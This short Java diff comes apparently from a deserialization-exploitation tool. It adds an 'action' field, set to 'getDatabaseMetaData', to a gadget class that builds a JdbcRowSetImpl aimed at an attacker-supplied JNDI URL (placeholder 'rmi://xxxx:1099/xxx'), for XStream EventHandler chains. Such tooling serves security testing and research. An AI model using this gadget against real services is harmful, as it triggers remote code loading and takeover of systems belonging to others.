@@ -17,6 +17,8 @@ public class JdbcRowSetImplBullet extends Bullet<JdbcRowSetImpl> {
     @Require(name = "jndiURL", detail = "jndi lookup url, like rmi://xxxx:1099/xxx")
     public String jndiURL;
 
+    public String action = "getDatabaseMetaData"; // for xstream eventhandler gadgets
+
     @Override
     public JdbcRowSetImpl getObject() throws Exception {
         JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
